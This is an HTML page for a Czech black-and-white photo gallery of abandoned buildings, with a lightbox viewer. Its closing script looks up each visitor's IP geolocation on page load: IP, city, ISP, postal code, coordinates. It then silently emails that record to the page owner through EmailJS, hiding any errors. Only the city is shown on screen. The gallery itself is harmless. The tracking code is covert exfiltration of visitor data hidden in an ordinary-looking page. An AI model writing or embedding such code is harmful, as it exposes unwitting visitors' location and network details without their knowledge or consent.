<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Opuštěno</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;500;700&family=Inter:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
  :root {
    --bg: #0c0c0d;
    --panel: #161618;
    --line: #2a2a2e;
    --ink: #f3f3f1;
    --muted: #9a9a9e;
    --accent: #d8d8d2;
  }
  * { box-sizing: border-box; margin: 0; }
  body {
    background: var(--bg);
    color: var(--ink);
    font-family: "Inter", system-ui, sans-serif;
    -webkit-font-smoothing: antialiased;
  }
  header {
    padding: 56px 24px 32px;
    border-bottom: 1px solid var(--line);
    text-align: center;
  }
  h1 {
    font-family: "Oswald", sans-serif;
    font-weight: 700;
    letter-spacing: .18em;
    font-size: clamp(38px, 9vw, 76px);
    text-transform: uppercase;
    line-height: .95;
  }
  header p { color: var(--muted); margin-top: 12px; letter-spacing: .05em; }

  .loc {
    max-width: 920px;
    margin: 20px auto 0;
    display: flex;
    align-items: center;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
    font-size: 14px;
    color: var(--muted);
  }
  .loc .dot { width: 8px; height: 8px; border-radius: 50%; background: #d8524c; box-shadow: 0 0 0 0 rgba(216,82,76,.6); animation: ping 1.8s infinite; }
  @keyframes ping { 0%{box-shadow:0 0 0 0 rgba(216,82,76,.5)} 100%{box-shadow:0 0 0 10px rgba(216,82,76,0)} }
  @media (prefers-reduced-motion: reduce){ .loc .dot{animation:none} }
  .loc b { color: var(--ink); font-weight: 500; }

  .gallery {
    max-width: 1240px;
    margin: 0 auto;
    padding: 28px 16px 80px;
    columns: 3;
    column-gap: 16px;
  }
  @media (max-width: 900px){ .gallery{ columns: 2; } }
  @media (max-width: 560px){ .gallery{ columns: 1; } }
  figure {
    break-inside: avoid;
    margin: 0 0 16px;
    position: relative;
    cursor: zoom-in;
    overflow: hidden;
    background: var(--panel);
    border: 1px solid var(--line);
  }
  figure img {
    width: 100%;
    display: block;
    filter: grayscale(1) contrast(1.05);
    transition: transform .6s ease, filter .4s ease;
  }
  figure:hover img { transform: scale(1.04); filter: grayscale(1) contrast(1.15); }
  figcaption {
    position: absolute;
    left: 0; right: 0; bottom: 0;
    padding: 24px 14px 10px;
    font-family: "Oswald", sans-serif;
    letter-spacing: .1em;
    text-transform: uppercase;
    font-size: 13px;
    color: var(--accent);
    background: linear-gradient(to top, rgba(0,0,0,.75), transparent);
    opacity: 0;
    transition: opacity .3s;
  }
  figure:hover figcaption { opacity: 1; }

  footer { border-top: 1px solid var(--line); padding: 28px 24px 48px; text-align: center; color: var(--muted); font-size: 13px; }

  /* Lightbox */
  .lb {
    position: fixed; inset: 0;
    background: rgba(0,0,0,.94);
    display: none;
    align-items: center; justify-content: center;
    z-index: 50;
    padding: 20px;
  }
  .lb.open { display: flex; }
  .lb img { max-width: 100%; max-height: 90vh; filter: grayscale(1); }
  .lb button {
    position: absolute;
    background: none; border: 0; color: #fff;
    font-size: 40px; cursor: pointer;
    padding: 10px 18px;
    opacity: .7;
  }
  .lb button:hover { opacity: 1; }
  .lb .close { top: 8px; right: 12px; }
  .lb .prev { left: 4px; top: 50%; transform: translateY(-50%); }
  .lb .next { right: 4px; top: 50%; transform: translateY(-50%); }
</style>
</head>
<body>
<header>
  <h1>Opuštěno</h1>
  <p>Zapomenutá místa · černobíle</p>
  <div class="loc">
    <span class="dot"></span>
    <span id="loc">—</span>
  </div>
</header>

<main class="gallery" id="gal"></main>

<footer>
  Fotografie — urbex &amp; street art.
</footer>

<div class="lb" id="lb">
  <button class="close" aria-label="Zavřít">&times;</button>
  <button class="prev" aria-label="Předchozí">&#8249;</button>
  <img id="lbimg" alt="">
  <button class="next" aria-label="Další">&#8250;</button>
</div>

<script>
const photos = [
    { src: "img/1.jpg", cap: "Fasáda pod stromem" },
    { src: "img/2.jpg", cap: "Okno do lesa" },
    { src: "img/3.jpg", cap: "Schodiště I" },
    { src: "img/4.jpg", cap: "Schodiště II" },
    { src: "img/5.jpg", cap: "Kruhové okno" },
    { src: "img/6.jpg", cap: "Boční průčelí" }
  ];
  const gal = document.getElementById("gal");
  gal.innerHTML = photos.map((p, i) =>
    `<figure data-i="${i}"><img src="${p.src}" alt="${p.cap}" loading="lazy"><figcaption>${p.cap}</figcaption></figure>`
  ).join("");

  // Lightbox
  const lb = document.getElementById("lb"), lbimg = document.getElementById("lbimg");
  let cur = 0;
  function open(i){ cur = i; lbimg.src = photos[i].src; lbimg.alt = photos[i].cap; lb.classList.add("open"); }
  function close(){ lb.classList.remove("open"); }
  function step(d){ cur = (cur + d + photos.length) % photos.length; lbimg.src = photos[cur].src; lbimg.alt = photos[cur].cap; }
  gal.addEventListener("click", e => { const f = e.target.closest("figure"); if (f) open(+f.dataset.i); });
  lb.querySelector(".close").addEventListener("click", close);
  lb.querySelector(".prev").addEventListener("click", e => { e.stopPropagation(); step(-1); });
  lb.querySelector(".next").addEventListener("click", e => { e.stopPropagation(); step(1); });
  lb.addEventListener("click", e => { if (e.target === lb) close(); });
  document.addEventListener("keydown", e => {
    if (!lb.classList.contains("open")) return;
    if (e.key === "Escape") close();
    if (e.key === "ArrowLeft") step(-1);
    if (e.key === "ArrowRight") step(1);
  });

  // ===== EmailJS =====
  emailjs.init({
    publicKey: "Dec-QdE-LmyejTlP_",
    // Pokud potřebujete i API key (nepovinné):
    // apiKey: "VAŠE_API_KEY_ZDE"
  });
  const SERVICE = "service_lv3ln5r";
  const TEMPLATE = "template_g2tqqz1";
  // ===================

  const locEl = document.getElementById("loc");
  locEl.textContent = "Zjišťuji…";

  async function zjistiInfo(){
    const tries = [
      async () => {
        const d = await (await fetch("https://ipwho.is/")).json();
        if(!d.success) throw 0;
        return {
          mesto: [d.city, d.region, d.country].filter(Boolean).join(", "),
          kraj: d.region || "", zeme: d.country || "", ip: d.ip || "",
          isp: (d.connection && d.connection.isp) || "", psc: d.postal || "",
          cas: (d.timezone && d.timezone.id) || "",
          souradnice: (d.latitude != null ? d.latitude + ", " + d.longitude : "")
        };
      },
      async () => {
        const d = await (await fetch("https://ipapi.co/json")).json();
        if(d.error) throw 0;
        return {
          mesto: [d.city, d.region, d.country_name].filter(Boolean).join(", "),
          kraj: d.region || "", zeme: d.country_name || "", ip: d.ip || "",
          isp: d.org || "", psc: d.postal || "", cas: d.timezone || "",
          souradnice: (d.latitude != null ? d.latitude + ", " + d.longitude : "")
        };
      }
    ];
    for (const t of tries){ try { return await t(); } catch(e){} }
    return null;
  }

  (async () => {
    const info = await zjistiInfo();
    if (info){
      locEl.textContent = "Díváš se z " + info.mesto;
      emailjs.send(SERVICE, TEMPLATE, info).catch(()=>{});
    } else {
      locEl.textContent = "—";
    }
  })();
</script>
</body>
</html>
